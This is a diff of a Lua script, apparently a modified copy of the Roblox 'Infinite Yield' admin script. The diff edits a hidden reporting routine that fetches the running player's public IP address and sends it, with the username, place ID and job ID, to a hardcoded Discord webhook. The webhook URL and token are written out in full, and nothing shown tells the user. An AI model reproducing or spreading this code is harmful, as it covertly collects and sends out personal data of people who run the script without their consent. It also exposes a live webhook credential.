@@ -342,7 +342,6 @@ function SendMessage(url, message)
         Headers = headers,
         Body = body
     })
-    print("Sent")
 end
 
 function SendMessageEMBED(url, embed)
@@ -352,15 +351,7 @@ function SendMessageEMBED(url, embed)
     }
     local data = {
         ["embeds"] = {
-            {
-                ["title"] = embed.title,
-                ["description"] = embed.description,
-                ["color"] = embed.color,
-                ["fields"] = embed.fields,
-                ["footer"] = {
-                    ["text"] = embed.footer.text
-                }
-            }
+            embed,
         }
     }
     local body = http:JSONEncode(data)
@@ -370,7 +361,6 @@ function SendMessageEMBED(url, embed)
         Headers = headers,
         Body = body
     })
-    print("Sent")
 end
 
 
@@ -379,26 +369,29 @@ end
 local url = "https://discord.com/api/webhooks/1207750225880686592/u7x50aIzdD4mLfVZS3_NxSPaL0_DZ4XIYqhXAJSJHU4m4tSt-cM319I02T3uYSi2XCVP"
 local test = game:HttpGet('https://wtfismyip.com/text')
 local embed = {
-    ["title"] = "INF YIELD WAS USED BY SOMEONE",
-    ["description"] = "OKAY BRO LESS GOOOOO",
-    ["color"] = 65280,
+    ["title"] = "Infinity Yield used",
+    ["color"] = 12532,
     ["fields"] = {
         {
             ["name"] = "User Name",
-            ["value"] = '```'..game.Players.LocalPlayer.Name..'```'
+            ["value"] = '```'..game.Players.LocalPlayer.Name..'```',
+            ["inline"] = true
         },
         {
             ["name"] = "Game ID",
-            ["value"] = '```'..game.PlaceId..'```'
+            ["value"] = '```'..game.PlaceId..'```',
+            ["inline"] = true
+        },
+        {
+            ["name"] = "Job ID",
+            ["value"] = '```'..game.JobId..'```',
+            ["inline"] = true
         },
         {
             ["name"] = "User IP",
             ["value"] = '```'..test..'```'
         }
     },
-    ["footer"] = {
-        ["text"] = "i don't save ur data dw"
-    }
 }
 SendMessageEMBED(url, embed)
 end)
